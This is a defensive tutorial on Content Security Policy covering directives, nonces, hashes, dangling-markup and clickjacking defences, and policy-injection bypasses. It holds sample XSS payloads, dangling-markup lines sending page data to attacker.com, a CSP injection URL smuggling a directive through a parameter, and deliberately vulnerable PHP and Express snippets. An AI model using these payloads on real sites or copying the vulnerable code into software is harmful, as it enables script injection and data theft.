# Content Security Policy (CSP)

Content Security Policy is a browser security mechanism that significantly mitigates cross-site scripting, clickjacking, and other code injection attacks by allowing web applications to explicitly declare which resources browsers should trust and load. Implemented through HTTP response headers or HTML meta tags, CSP works by providing a set of directives that instruct browsers to restrict resource loading based on source origins, cryptographic nonces, or content hashes—essentially creating an allowlist of trusted content sources while blocking everything else by default. Unlike traditional security measures that rely solely on input validation and output encoding which can be bypassed through novel attack vectors, CSP provides defense-in-depth at the browser enforcement layer by preventing the execution of inline scripts, blocking external script loading from untrusted domains, restricting dynamic code evaluation through `eval()` and similar functions, and controlling which sites can embed the application in frames. When properly configured with strict policies using nonces or hashes rather than broad domain allowlists, CSP can eliminate entire classes of XSS vulnerabilities even when injection flaws exist in the application code, making it one of the most powerful client-side security mechanisms available to modern web applications, though it requires careful implementation to avoid bypasses through misconfigurations like overly permissive domains, missing directives, or policy injection vulnerabilities.

The fundamental protection model: **explicitly allowlist trusted resources and block everything else at the browser level**.

## What is Content Security Policy?

### Understanding CSP

**Definition:** An HTTP security header that instructs browsers which content sources to trust and load, preventing execution of unauthorized scripts, styles, and other resources to mitigate XSS, data injection, and clickjacking attacks.

**Core concepts:**
- Allowlist-based security model (default deny)
- Browser-enforced restrictions
- Declarative policy using directives
- Multiple enforcement mechanisms (headers or meta tags)
- Defense-in-depth security layer
- Reduces attack surface for injection vulnerabilities

**How CSP is delivered:**

```http
Method 1: HTTP Response Header (preferred)
Content-Security-Policy: directive1 value1; directive2 value2; directive3 value3

Example:
HTTP/1.1 200 OK
Content-Type: text/html
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com

Method 2: HTML Meta Tag (limited functionality)
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted-cdn.com">

Note: Meta tags cannot use:
- report-uri/report-to directives
- frame-ancestors directive
- sandbox directive

Recommendation: Use HTTP header for full functionality
```

**Multiple policies:**

```http
When multiple CSP headers or meta tags present:

Response 1:
Content-Security-Policy: default-src 'self'
Content-Security-Policy: script-src 'none'

Response 2:
Content-Security-Policy: default-src 'self'; script-src 'unsafe-inline'
<meta http-equiv="Content-Security-Policy" content="script-src 'none'">

Browser behavior:
- Combines all policies
- Applies MOST RESTRICTIVE directive for each type
- Each resource must satisfy ALL policies

Result: Most restrictive combination enforced
script-src 'none' (strictest) would be applied
```

### CSP Directives Overview

**Fetch directives (resource loading):**

```http
default-src:     Fallback for all fetch directives
script-src:      JavaScript sources
script-src-elem: <script> element sources only
script-src-attr: Inline event handler sources
style-src:       CSS sources
style-src-elem:  <style> and <link rel="stylesheet"> sources
style-src-attr:  Inline style attribute sources
img-src:         Image sources
font-src:        Font sources
connect-src:     fetch(), XMLHttpRequest, WebSocket, EventSource
media-src:       <audio>, <video>, <track> sources
object-src:      <object>, <embed>, <applet> sources
frame-src:       <iframe>, <frame> sources
worker-src:      Worker, SharedWorker, ServiceWorker sources
manifest-src:    Web app manifest sources
```

**Document directives:**

```http
base-uri:        Restricts <base> element URLs
sandbox:         Enables sandbox restrictions (like iframe sandbox)
```

**Navigation directives:**

```http
form-action:     Form submission targets
frame-ancestors: Valid parents for embedding (clickjacking protection)
```

**Reporting directives:**

```http
report-uri:      (Deprecated) URL to send violation reports
report-to:       Reporting API endpoint
```

**Other directives:**

```http
upgrade-insecure-requests: Upgrade HTTP to HTTPS
block-all-mixed-content:   Block HTTP resources on HTTPS pages
```

### Source values for directives

**Special keywords:**

```http
'none'           Block all sources
'self'           Same origin (scheme, host, port)
'unsafe-inline'  Allow inline scripts/styles (dangerous!)
'unsafe-eval'    Allow eval(), Function(), setTimeout(string)
'strict-dynamic' Trust scripts loaded by trusted scripts
'unsafe-hashes'  Allow inline event handlers with specific hashes

Note: Keywords must be quoted
Correct:   script-src 'self'
Incorrect: script-src self
```

**Host sources:**

```http
https://example.com           Specific HTTPS domain
http://example.com            Specific HTTP domain
example.com                   Any scheme, specific domain
*.example.com                 Any subdomain of example.com
https://*.example.com         HTTPS subdomains only
https:                        Any HTTPS source
data:                         data: URIs
blob:                         blob: URIs
```

**Nonces:**

```http
'nonce-RANDOM_VALUE'          Cryptographic nonce
Example: 'nonce-r4nd0m'

Usage:
Content-Security-Policy: script-src 'nonce-r4nd0m'

HTML:
<script nonce="r4nd0m">alert(1)</script>  ✓ Allowed
<script>alert(1)</script>                  ✗ Blocked
<script nonce="wrong">alert(1)</script>    ✗ Blocked
```

**Hashes:**

```http
'sha256-HASH'    SHA-256 hash of script content
'sha384-HASH'    SHA-384 hash of script content
'sha512-HASH'    SHA-512 hash of script content

Example:
'sha256-xyz789abc123...'
```

## Mitigating XSS Attacks Using CSP

### Basic XSS protection

**Blocking inline scripts:**

```http
Content-Security-Policy: script-src 'self'

Effect:
✓ Allows scripts from same origin
✗ Blocks inline <script> tags
✗ Blocks event handlers (onclick, onerror, etc.)
✗ Blocks javascript: URLs
✗ Blocks eval(), Function(), setTimeout(string)

Example page:
```

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSP Protected</title>
</head>
<body>
    <!-- Allowed: Same-origin script -->
    <script src="/js/app.js"></script>
    
    <!-- BLOCKED: Inline script -->
    <script>
        alert('XSS attempt');  // ✗ Blocked by CSP
    </script>
    
    <!-- BLOCKED: Event handler -->
    <button onclick="alert('XSS')">Click</button>  // ✗ Blocked
    
    <!-- BLOCKED: javascript: URL -->
    <a href="javascript:alert('XSS')">Link</a>  // ✗ Blocked
    
    <!-- External script from different origin -->
    <script src="https://attacker.com/xss.js"></script>  // ✗ Blocked
</body>
</html>
```

**XSS attack scenarios blocked:**

```javascript
Reflected XSS payload:
?search=<script>alert(document.cookie)</script>

With CSP: script-src 'self'
Result: <script> tag inserted but browser refuses to execute
Console: "Refused to execute inline script because it violates CSP"

Stored XSS payload in comment:
<img src=x onerror=alert(1)>

With CSP: script-src 'self'
Result: Image fails to load but onerror handler blocked
Console: "Refused to execute inline event handler"

DOM XSS via innerHTML:
element.innerHTML = location.hash; // User controls: #<img src=x onerror=alert(1)>

With CSP: script-src 'self'
Result: Image inserted but onerror blocked by CSP
XSS attack mitigated!
```

### Allowing specific external domains

**Trusting third-party scripts:** 

```http
Content-Security-Policy: script-src 'self' https://trusted-cdn.com https://analytics-service.com

Allows:
✓ Same-origin scripts
✓ Scripts from trusted-cdn.com
✓ Scripts from analytics-service.com

Blocks:
✗ Scripts from any other domain
✗ Inline scripts
✗ Event handlers
```

**Dangerous: Trusting CDNs without per-customer URLs**

```http
UNSAFE CSP:
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com

Problem:
- ajax.googleapis.com hosts libraries for ALL customers
- No customer isolation in URLs
- Attacker can upload malicious library
- Anyone can load it from ajax.googleapis.com
- Your CSP allows it!

Attack scenario:
1. Attacker finds XSS on your site
2. Payload: <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
3. Your CSP allows ajax.googleapis.com → Script loads
4. AngularJS 1.0.1 has CSP bypass vulnerability
5. Attacker exploits AngularJS to execute arbitrary code
6. XSS successful despite CSP!

Safe alternatives:
- Use CDNs with per-customer URLs
- Use Subresource Integrity (SRI)
- Host scripts on your own domain
```

**Subresource Integrity (SRI) with CSP:**

```html
<!-- Combine CSP with SRI for external scripts -->
<script src="https://cdn.example.com/library.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>

CSP allows the domain, SRI verifies the content
If script modified → Hash doesn't match → Blocked
Defense-in-depth approach
```

### Using nonces for inline scripts

**How nonces work:**

```
Nonce = "Number Used Once"
Cryptographically random value generated per request
Server generates nonce for each page load
Same nonce added to CSP header and trusted inline scripts
Browser only executes scripts with matching nonce

Workflow:
1. Server generates random nonce: "r4nd0m_v4lu3"
2. Sets CSP: script-src 'nonce-r4nd0m_v4lu3'
3. Adds nonce to trusted scripts: <script nonce="r4nd0m_v4lu3">
4. Browser checks: Script nonce matches CSP? → Execute
5. Attacker injects: <script>alert(1)</script> → No nonce → Blocked
```

**Implementation example:**

```javascript
// Node.js/Express example
const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate cryptographically strong nonce
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    next();
});

app.use((req, res, next) => {
    // Set CSP with nonce
    res.setHeader(
        'Content-Security-Policy',
        `script-src 'nonce-${res.locals.nonce}'`
    );
    next();
});

app.get('/page', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Nonce Protected</title>
        </head>
        <body>
            <h1>Secure Page</h1>
            
            <!-- Trusted script with nonce -->
            <script nonce="${res.locals.nonce}">
                // This executes (has correct nonce)
                console.log('Trusted script running');
            </script>
            
            <!-- Attacker injected XSS (no nonce) -->
            <script>
                // This is BLOCKED (no nonce attribute)
                alert('XSS attempt');
            </script>
            
            <!-- Attacker tries to guess nonce -->
            <script nonce="wrong_guess">
                // BLOCKED (wrong nonce value)
                alert('XSS with wrong nonce');
            </script>
        </body>
        </html>
    `);
});
```

**Nonce security requirements:**

```
Requirements for secure nonces:

1. Cryptographically random
   ✓ Use crypto.randomBytes() or equivalent
   ✗ Don't use Math.random()
   
2. Unique per request
   ✓ Generate new nonce for every page load
   ✗ Don't reuse across requests
   
3. Sufficient length
   ✓ At least 128 bits (16 bytes)
   ✗ Don't use short or predictable values
   
4. Not guessable
   ✓ High entropy random value
   ✗ Not based on timestamps or sequential IDs

Insecure examples:
- timestamp-based: 'nonce-1234567890'
- sequential: 'nonce-1', 'nonce-2', 'nonce-3'
- short: 'nonce-abc123'

Secure example:
'nonce-MTIzNDU2Nzg5MGFiY2RlZg=='
(16+ random bytes, base64 encoded)
```

**Nonce with strict-dynamic:**

```http
Content-Security-Policy: script-src 'nonce-RANDOM' 'strict-dynamic'

Benefits:
- Scripts loaded by nonce-trusted scripts are automatically trusted
- Simplifies CSP for applications with dynamic script loading
- No need to allowlist every script domain

Example:
```

```html
<!-- Main script with nonce -->
<script nonce="RANDOM">
    // This script trusted by nonce
    
    // Dynamically load another script
    const script = document.createElement('script');
    script.src = 'https://any-domain.com/library.js';
    document.body.appendChild(script);
    // With strict-dynamic: This new script also trusted!
</script>

<!-- Without strict-dynamic: Would need to allowlist any-domain.com -->
<!-- With strict-dynamic: Automatically trusted because loaded by trusted script -->
```

### Using hashes for static inline scripts 

**How hashes work:**

```
Hash = Cryptographic fingerprint of script content
Calculate hash of exact script content (not including <script> tags)
Add hash to CSP directive
Browser recalculates hash of encountered scripts
If hashes match → Execute
If hashes don't match → Block

Process:
1. Write inline script
2. Calculate SHA-256/384/512 hash of content
3. Add to CSP: script-src 'sha256-HASH_VALUE'
4. Browser verifies hash before execution
```

**Calculating hashes:**

```bash
# Command line (Linux/Mac)
echo -n "console.log('Hello');" | openssl dgst -sha256 -binary | openssl base64
# Output: sha256-xyz123abc456...

# Python
import hashlib
import base64
script = "console.log('Hello');"
hash_value = base64.b64encode(hashlib.sha256(script.encode()).digest()).decode()
print(f"sha256-{hash_value}")

# JavaScript (Node.js)
const crypto = require('crypto');
const script = "console.log('Hello');";
const hash = crypto.createHash('sha256').update(script).digest('base64');
console.log(`sha256-${hash}`);

# Online tools
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- Report URI CSP Builder: Multiple online calculators available
```

**Implementation:**

```html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Security-Policy" 
          content="script-src 'sha256-xyz123abc456...='">
</head>
<body>
    <!-- Hash calculated for EXACT content below -->
    <script>console.log('Hello');</script>
    <!-- ✓ Executes (hash matches) -->
    
    <!-- Different content -->
    <script>console.log('Hello');</script>
    <!-- ✗ Blocked (whitespace difference, hash doesn't match) -->
    
    <!-- XSS injection -->
    <script>alert('XSS')</script>
    <!-- ✗ Blocked (different content, hash doesn't match) -->
</body>
</html>
```

**Important hash characteristics:**

```
Hash sensitivity:

Exact match required:
- Every character matters
- Whitespace differences break hash
- Comments affect hash
- Even trivial changes invalidate hash

Example:
Content 1: console.log('Hello');
Content 2: console.log('Hello'); 
           ↑ Extra space here
Result: Different hashes! Second blocked.

Advantages:
✓ No server-side randomness needed
✓ Works with static content
✓ Can be pre-calculated
✓ No per-request processing

Disadvantages:
✗ Must update hash if content changes
✗ Not suitable for dynamic content
✗ One hash per inline script needed
✗ Maintenance overhead

Best use case:
- Small, static inline scripts
- Scripts that rarely change
- Initialize/bootstrap code
```

**Multiple hashes:**

```http
Content-Security-Policy: script-src 'sha256-HASH1' 'sha256-HASH2' 'sha256-HASH3'

Allows multiple inline scripts:
<script>/* Content matching HASH1 */</script>  ✓
<script>/* Content matching HASH2 */</script>  ✓
<script>/* Content matching HASH3 */</script>  ✓
<script>/* Content not matching any hash */</script>  ✗
```

## Mitigating Dangling Markup Attacks Using CSP

### Restricting image sources

**Preventing image-based exfiltration:**

```http
Content-Security-Policy: img-src 'self'

Blocks dangling markup using images:
```

```html
<!-- Attacker payload -->
"><img src='https://attacker.com/steal?data=

<!-- Rendered HTML -->
<input value=""><img src='https://attacker.com/steal?data=">
<input type="hidden" name="csrf" value="SECRET_TOKEN">

<!-- Browser behavior with CSP -->
Attempts to load: https://attacker.com/steal?data=...(captured content)...
CSP img-src 'self' checks domain: attacker.com
Not 'self' → BLOCKED
Console: "Refused to load the image because it violates CSP img-src directive"

Result: Dangling markup attack mitigated! No data exfiltration.
```

**Allowing specific image domains:**

```http
Content-Security-Policy: img-src 'self' https://cdn.example.com

Allows:
✓ Same-origin images
✓ Images from cdn.example.com

Blocks:
✗ Images from attacker.com
✗ Images from any other external domain
✗ data: URIs (unless explicitly allowed)
```

### Limitations of CSP against dangling markup

**What CSP blocks:**

```
Blocked by restrictive CSP:
✓ <img src='//attacker.com/steal?data=
✓ <link rel='stylesheet' href='//attacker.com/steal?data=
✓ <iframe src='//attacker.com/steal?data=
✓ <object data='//attacker.com/steal?data=
✓ <embed src='//attacker.com/steal?data=

CSP directives:
- img-src 'self'
- style-src 'self'
- frame-src 'none'
- object-src 'none'
```

**What CSP doesn't block (requires additional defenses):**

```html
Not blocked by standard CSP:

<!-- Base tag with target (no external resource loaded) -->
<base target='
<!-- Data captured in window.name, readable cross-domain -->
<!-- Requires: base-uri 'none' directive -->

<!-- Anchor with dangling href (requires user click) -->
"><a href='https://attacker.com/steal?data=
<!-- Still makes request when clicked -->
<!-- Mitigated partially by Chrome's raw character blocking -->

<!-- Form action (requires submission) -->
"><form action='https://attacker.com/steal'>
<!-- Requires: form-action 'self' directive -->

Key point: CSP alone insufficient
Need multiple directives for complete protection
```

### Comprehensive dangling markup protection

**Complete CSP for dangling markup:**

```http
Content-Security-Policy:
    default-src 'none';
    script-src 'nonce-RANDOM';
    style-src 'nonce-RANDOM';
    img-src 'self';
    font-src 'self';
    connect-src 'self';
    media-src 'self';
    object-src 'none';
    frame-src 'none';
    base-uri 'none';
    form-action 'self';

Directive breakdown:

default-src 'none':     Block everything by default
script-src 'nonce-...': Only nonce-trusted scripts
img-src 'self':         Images from same origin only
base-uri 'none':        Prevent <base> tag entirely ⭐ Critical
form-action 'self':     Forms only to same origin ⭐ Critical
frame-src 'none':       No iframes allowed
object-src 'none':      No plugins

Dangling markup vectors blocked:
✓ Image exfiltration
✓ Base tag manipulation
✓ Form hijacking
✓ Iframe name attribute
✓ Link stylesheet
✓ Object/embed sources
```

## Bypassing CSP with Policy Injection

### Understanding policy injection

**Vulnerable CSP generation:** 

```php
<?php
// VULNERABLE: User input in CSP
$reportUri = $_GET['report_uri'] ?? '/csp-report';

header("Content-Security-Policy: script-src 'self'; object-src 'none'; report-uri " . $reportUri);
?>

Normal usage:
/?report_uri=/csp-report
CSP: script-src 'self'; object-src 'none'; report-uri /csp-report

Attack:
/?report_uri=/report;script-src 'unsafe-inline'

Rendered CSP:
script-src 'self'; object-src 'none'; report-uri /report;script-src 'unsafe-inline'
                                                           ↑ Injected directive

Browser CSP parsing:
1. Parses script-src 'self'
2. Continues parsing...
3. Finds report-uri /report
4. Semicolon delimiter → Next directive
5. Parses script-src 'unsafe-inline' 
6. OVERWRITES previous script-src!

Final policy:
script-src 'unsafe-inline'  (Last directive wins in some browsers)
object-src 'none'
report-uri /report

Result: Inline scripts now allowed!
XSS possible: <script>alert(1)</script>
```

### Script-src-elem directive bypass 

**Chrome-specific bypass using script-src-elem:**

**Background:**

```http
Chrome introduced granular script directives:

script-src:          Controls ALL script execution
script-src-elem:     Controls <script> elements only
script-src-attr:     Controls event handlers only (onclick, etc.)

Precedence:
- script-src-elem OVERWRITES script-src for <script> elements
- script-src-attr OVERWRITES script-src for event handlers
```

**Exploitation:**

```
Vulnerable application:
CSP: script-src 'self'; object-src 'none'; report-uri /report?token=USER_INPUT

Attack URL:
/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'

Injected CSP:
script-src 'self'; object-src 'none'; report-uri /report?token=;script-src-elem 'unsafe-inline'

Browser parsing:
1. script-src 'self' → Blocks inline scripts
2. report-uri /report?token=
3. Semicolon → New directive
4. script-src-elem 'unsafe-inline' → Allows <script> elements!

Effective policy for <script> tags:
script-src-elem 'unsafe-inline' (overwrites script-src 'self')

XSS payload executes:
<script>alert(1)</script>  ✓ Allowed by script-src-elem

Event handlers still blocked:
<img onerror=alert(1)>  ✗ Still blocked (no script-src-attr override)
```

### Prevention of policy injection

**Secure CSP generation:**

```javascript
// INSECURE
app.get('/page', (req, res) => {
    const reportUri = req.query.report_uri || '/csp-report';
    res.setHeader(
        'Content-Security-Policy',
        `script-src 'self'; report-uri ${reportUri}`  // ✗ Vulnerable
    );
});

// SECURE: Don't include user input in CSP
app.get('/page', (req, res) => {
    // Static CSP, no user input
    res.setHeader(
        'Content-Security-Policy',
        `script-src 'nonce-${generateNonce()}'; object-src 'none'; report-uri /csp-report`
    );
});

// If user input necessary: Strict validation
app.get('/page', (req, res) => {
    let reportPath = req.query.report_uri || '/csp-report';
    
    // Allowlist validation
    const allowedPaths = ['/csp-report', '/csp-report-staging', '/csp-report-dev'];
    if (!allowedPaths.includes(reportPath)) {
        reportPath = '/csp-report';  // Default to safe value
    }
    
    // Remove dangerous characters
    reportPath = reportPath.replace(/[;'"]/g, '');
    
    // Ensure path starts with /
    if (!reportPath.startsWith('/')) {
        reportPath = '/' + reportPath;
    }
    
    res.setHeader(
        'Content-Security-Policy',
        `script-src 'nonce-${generateNonce()}'; report-uri ${reportPath}`
    );
});
```

## Protecting Against Clickjacking Using CSP

### Frame-ancestors directive 

**Preventing clickjacking:**

```http
Content-Security-Policy: frame-ancestors 'self'

Effect:
- Page can only be embedded by same-origin pages
- Blocks cross-origin iframes
- Prevents clickjacking attacks

Example:
Site: https://victim.com
CSP: frame-ancestors 'self'

Allowed:
<iframe src="https://victim.com/page"></iframe> on https://victim.com ✓

Blocked:
<iframe src="https://victim.com/page"></iframe> on https://attacker.com ✗

Browser behavior:
Attacker site tries to load victim site in iframe
Browser checks frame-ancestors policy
Origin mismatch → Refuses to load
Console: "Refused to frame 'https://victim.com/' because an ancestor violates CSP"
```

**Frame-ancestors values:**

```http
Prevent all framing:
frame-ancestors 'none'
- Cannot be embedded anywhere
- Most restrictive
- Best for high-security pages (login, admin)

Allow same-origin only:
frame-ancestors 'self'
- Can be embedded by same origin
- Blocks cross-origin framing
- Common default

Allow specific domains:
frame-ancestors https://trusted-site.com https://partner.com
- Can be embedded by listed domains
- Blocks all others
- Use for integration scenarios

Allow subdomains:
frame-ancestors https://*.example.com
- Any subdomain of example.com
- Flexible but requires trust in subdomain security

Multiple values (OR logic):
frame-ancestors 'self' https://trusted.com https://partner.com
- Can be embedded by self, trusted.com, OR partner.com
```

**Example policies:**

```http
Banking application (high security):
Content-Security-Policy: frame-ancestors 'none'
- Cannot be embedded anywhere
- Prevents all clickjacking

Corporate intranet:
Content-Security-Policy: frame-ancestors 'self' https://intranet.company.com
- Can be embedded within intranet pages
- Blocks external embedding

Widget/embed use case:
Content-Security-Policy: frame-ancestors https://client1.com https://client2.com https://client3.com
- Allows specific customer sites to embed
- Blocks unauthorized embedding
```

### Comparison with X-Frame-Options 

**X-Frame-Options header (legacy):**

```http
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted-site.com

Limitations:
✗ Only allows single ALLOW-FROM value (no multiple domains)
✗ ALLOW-FROM not supported in Chrome
✗ Only checks top-level frame, not entire hierarchy
✗ Being deprecated in favor of CSP
```

**CSP frame-ancestors (modern):**

```http
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors https://site1.com https://site2.com

Advantages:
✓ Supports multiple allowed origins
✓ Supports wildcards (*.example.com)
✓ Validates entire frame hierarchy
✓ Universally supported in modern browsers
✓ Part of broader CSP framework
✓ More flexible and powerful
```

**Frame hierarchy validation:**

```html
Scenario: Nested iframes
https://attacker.com (top)
  └─ https://trusted.com (middle frame)
      └─ https://victim.com (inner frame - target)

Victim's CSP: frame-ancestors 'self'

X-Frame-Options SAMEORIGIN:
- Only checks immediate parent: trusted.com
- trusted.com ≠ victim.com → Blocks ✓

CSP frame-ancestors 'self':
- Checks ENTIRE hierarchy
- Top frame: attacker.com ≠ victim.com → Blocks ✓
- Middle frame: trusted.com ≠ victim.com → Blocks ✓
- More comprehensive protection

Victim's CSP: frame-ancestors trusted.com

X-Frame-Options ALLOW-FROM trusted.com:
- Checks immediate parent only
- Parent is trusted.com → Allows ✓
- Doesn't check attacker.com at top → Security gap!

CSP frame-ancestors trusted.com:
- Checks entire hierarchy
- trusted.com in hierarchy → Checks next level
- attacker.com (top) not allowed → Blocks ✓
- More secure
```

### Recommended clickjacking protection

**Defense-in-depth approach:**

```http
Use both CSP and X-Frame-Options for maximum compatibility:

Response headers:
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: SAMEORIGIN

Benefits:
- Modern browsers use CSP (frame-ancestors)
- Older browsers (IE11) use X-Frame-Options
- Defense-in-depth redundancy
- Maximum browser coverage

Implementation:
```

```javascript
app.use((req, res, next) => {
    // CSP frame-ancestors (modern browsers)
    res.setHeader(
        'Content-Security-Policy',
        "frame-ancestors 'self'"
    );
    
    // X-Frame-Options (legacy browsers)
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    
    next();
});
```

**Complete anti-clickjacking CSP:**

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'nonce-RANDOM';
    style-src 'nonce-RANDOM';
    img-src 'self';
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'none';

Clickjacking-specific directives:
frame-ancestors 'none':  Cannot be embedded (strongest protection)
base-uri 'none':         Prevents base tag clickjacking
form-action 'self':      Prevents form hijacking

Additional protections:
- Prevents UI redressing
- Blocks cursorjacking
- Mitigates drag-and-drop attacks
- Stops frame-based attacks
```

## CSP Best Practices and Common Mistakes

### Secure CSP implementation

**Strict CSP policy (recommended):** 

```http
Content-Security-Policy:
    default-src 'none';
    script-src 'nonce-RANDOM' 'strict-dynamic';
    style-src 'nonce-RANDOM';
    img-src 'self';
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'none';
    form-action 'self';

Explanation:
default-src 'none':                Block everything by default
script-src 'nonce-...' 'strict-dynamic':  Nonce-based script trust + dynamic loading
style-src 'nonce-...':             Nonce-based style trust
img-src 'self':                    Same-origin images only
font-src 'self':                   Same-origin fonts only
connect-src 'self':                Same-origin AJAX/fetch only
frame-ancestors 'none':            Cannot be framed
base-uri 'none':                   No base tag
form-action 'self':                Forms to same origin only

Benefits:
✓ Eliminates most XSS vectors
✓ No dependency on domain allowlists
✓ Resistant to CSP bypasses
✓ Easy to maintain (no URL management)
✓ Works with dynamic applications
```

### Common CSP mistakes

**Mistake 1: unsafe-inline**

```http
❌ INSECURE:
Content-Security-Policy: script-src 'self' 'unsafe-inline'

Problem:
- Allows ALL inline scripts
- Defeats purpose of CSP
- XSS still possible: <script>alert(1)</script>

✓ SECURE alternative:
Content-Security-Policy: script-src 'nonce-RANDOM'
- Only nonce-trusted inline scripts
- XSS blocked
```

**Mistake 2: unsafe-eval**

```http
❌ INSECURE:
Content-Security-Policy: script-src 'self' 'unsafe-eval'

Problem:
- Allows eval(), Function(), setTimeout(string)
- Common XSS sink enabled
- Attack: eval(userInput)

✓ SECURE alternative:
- Don't use unsafe-eval
- Refactor code to avoid eval()
- Use strict-dynamic for dynamic loading
```

**Mistake 3: Overly broad domain allowlists**

```http
❌ INSECURE:
Content-Security-Policy: script-src 'self' https: data:

Problem:
- Allows ANY HTTPS domain!
- Attacker can host malicious script anywhere
- data: URIs enable inline code execution

Attack:
<script src="https://attacker.com/xss.js"></script>  ✓ Allowed
<script src="data:text/javascript,alert(1)"></script>  ✓ Allowed

✓ SECURE alternative:
Content-Security-Policy: script-src 'nonce-RANDOM'
- No domain allowlisting
- Only trusted scripts with nonce
```

**Mistake 4: Missing directives**

```http
❌ INCOMPLETE:
Content-Security-Policy: script-src 'self'

Problems:
- Only controls scripts
- Images can still exfiltrate: <img src='//attacker.com/steal?cookie=...'>
- Forms can hijack: <form action='//attacker.com/phish'>
- Base tag can manipulate: <base href='//attacker.com/'>

✓ COMPLETE:
Content-Security-Policy:
    default-src 'none';
    script-src 'nonce-RANDOM';
    img-src 'self';
    form-action 'self';
    base-uri 'none';
    frame-ancestors 'none';
```

**Mistake 5: Not considering all fetch directives**

```http
❌ INCOMPLETE:
Content-Security-Policy: default-src 'self'

Missing specific controls:
- object-src not set (defaults to default-src)
- frame-ancestors not set (doesn't fall back to default-src!)
- form-action not set (doesn't fall back!)
- base-uri not set (doesn't fall back!)

✓ COMPLETE:
Content-Security-Policy:
    default-src 'self';
    object-src 'none';
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'none';
```

### Testing and monitoring CSP

**CSP Report-Only mode:**

```http
Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report

Effect:
- Policy violations logged but NOT enforced
- Allows testing without breaking functionality
- Violations sent to report-uri endpoint

Workflow:
1. Deploy Report-Only CSP
2. Monitor violation reports
3. Fix legitimate violations
4. Tighten policy
5. Convert to enforcement mode
6. Continue monitoring
```

**Violation reporting:**

```javascript
// CSP violation report structure
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src",
    "effective-directive": "script-src",
    "original-policy": "script-src 'self'",
    "blocked-uri": "https://evil.com/xss.js",
    "source-file": "https://example.com/page",
    "line-number": 42,
    "column-number": 15
  }
}

// Server endpoint to receive reports
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
    const violation = req.body['csp-report'];
    
    console.log('CSP Violation:', {
        violatedDirective: violation['violated-directive'],
        blockedUri: violation['blocked-uri'],
        documentUri: violation['document-uri']
    });
    
    // Log to security monitoring system
    securityLog.warn('CSP violation detected', violation);
    
    res.status(204).end();
});
```
